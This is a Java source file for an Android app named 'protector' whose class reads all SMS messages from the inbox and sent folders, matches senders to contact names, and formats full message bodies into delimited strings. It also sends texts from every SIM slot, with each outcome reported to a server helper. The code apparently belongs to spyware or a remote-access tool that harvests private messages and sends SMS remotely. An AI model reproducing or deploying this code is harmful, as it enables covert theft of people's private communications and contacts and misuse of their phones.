package com.icontrol.protector;

import static com.icontrol.protector.WorkServices.MyWorker.AlertServer;
import static com.icontrol.protector.Consts.SPLIT_ARAY;
import static com.icontrol.protector.Consts.SPLIT_LINE;

import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class mysmanager {
    public static String Load(Context c, String target) {
        String f = "null";
        Cursor mc = null;
        Cursor cr = null;

        try {
            StringBuffer sb = new StringBuffer();
            ArrayList<String> gr_nu = new ArrayList<>();
            ArrayList<String> gr_na = new ArrayList<>();

            Uri uri = Uri.parse("content://sms/");
            if ("Inbox".equals(target)) {
                uri = Uri.parse("content://sms/inbox");
            } else if ("Sent".equals(target)) {
                uri = Uri.parse("content://sms/sent");
            }

            mc = c.getContentResolver().query(uri,
                    new String[]{"_id", "thread_id", "address", "person", "date", "body", "type"},
                    null, null, null);

            String[] col = new String[]{"address", "person", "date", "body", "_id", "type", "thread_id"};

            if (mc != null && mc.getCount() > 0) {


                try {
                    ContentResolver crr = c.getContentResolver();
                    cr = crr.query(ContactsContract.Data.CONTENT_URI, null,
                            ContactsContract.Data.HAS_PHONE_NUMBER + "!=0 AND (" +
                                    ContactsContract.Data.MIMETYPE + "=? OR " +
                                    ContactsContract.Data.MIMETYPE + "=?)",
                            new String[]{
                                    ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE,
                                    ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE},
                            ContactsContract.Data.CONTACT_ID);

                    if (cr != null) {
                        int nameIndex = cr.getColumnIndex(ContactsContract.Data.DISPLAY_NAME);
                        int numberIndex = cr.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

                        if (nameIndex != -1 && numberIndex != -1) {
                            while (cr.moveToNext()) {
                                String name = cr.getString(nameIndex);
                                String number = cr.getString(numberIndex);
                                gr_nu.add(number);
                                gr_na.add(name);
                            }
                        } else {
                            Log.e("ContactError", "Missing columns in contact cursor.");
                        }
                    }
                } catch (Exception e) {
                    Log.e("ContactError", "Error loading contacts: " + e.getMessage());
                }


                String name = null;
                int indexsms = 0;
                int addressIndex = mc.getColumnIndex(col[0]);
                int dateIndex = mc.getColumnIndex(col[2]);
                int messageIndex = mc.getColumnIndex(col[3]);

                if (addressIndex != -1 && dateIndex != -1 && messageIndex != -1) {
                    while (mc.moveToNext()) {
                        String address = mc.getString(addressIndex);
                        long date = mc.getLong(dateIndex);
                        String message = mc.getString(messageIndex);
                        Date date_0 = new Date(date);

                        try {
                            int i = gr_nu.indexOf(address);
                            name = (i != -1) ? gr_na.get(i) : null;
                        } catch (Exception e) {
                            name = null;
                        }

                        String tag = (message.length() > 15) ? message.substring(0, 15) + "..." : message;

                        sb.append(address)
                                .append(SPLIT_ARAY)
                                .append(name)
                                .append(SPLIT_ARAY)
                                .append(date_0.toString())
                                .append(SPLIT_ARAY)
                                .append(tag)
                                .append(SPLIT_ARAY)
                                .append(message)
                                .append(SPLIT_ARAY)
                                .append(uri.getPath())
                                .append(SPLIT_ARAY)
                                .append(String.valueOf(indexsms))
                                .append(SPLIT_LINE);

                        indexsms++;
                    }
                } else {
                    Log.e("CursorError", "Column index error in message cursor.");
                }

                f = sb.toString();
            }
        } catch (Exception e) {
            Log.e("LoadFunction", "Error: " + e.getMessage());
        } finally {
            if (mc != null && !mc.isClosed()) mc.close();
            if (cr != null && !cr.isClosed()) cr.close();
        }

        return f;
    }

    public static void sendSMS(Context ctx, String phoneNo, String msg) {
        try {
            if (ActivityCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                AlertServer(ctx, "Message to " + phoneNo, "Permission not granted READ STATE.");
                return;
            }
            int allsims = getSimCount(ctx);
            for (int simSlot = 0;simSlot < allsims;simSlot++){

                SubscriptionManager subscriptionManager = (SubscriptionManager) ctx.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
                List<SubscriptionInfo> subscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();

                if (subscriptionInfoList != null && simSlot < subscriptionInfoList.size()) {
                    int subscriptionId = subscriptionInfoList.get(simSlot).getSubscriptionId();
                    SmsManager smsManager = SmsManager.getSmsManagerForSubscriptionId(subscriptionId);

                    smsManager.sendTextMessage(phoneNo, null, msg, null, null);
                    AlertServer(ctx, "Message to " + phoneNo, "Sent successfully via SIM slot " + simSlot);
                } else {
                    AlertServer(ctx, "Message to " + phoneNo, "Invalid SIM slot or no SIM found.");
                }
            }

        } catch (Exception e) {
            AlertServer(ctx, "Message to " + phoneNo, "Failed to send message: " + e.getMessage());
        }
    }

    public static int getSimCount(Context context) {
        SubscriptionManager subscriptionManager = (SubscriptionManager) context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
        if (subscriptionManager != null) {
            if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {

                return 0;
            }
            List<SubscriptionInfo> subscriptionList = subscriptionManager.getActiveSubscriptionInfoList();
            if (subscriptionList != null) {
                return subscriptionList.size();
            }
        }
        return 0;
    }
}
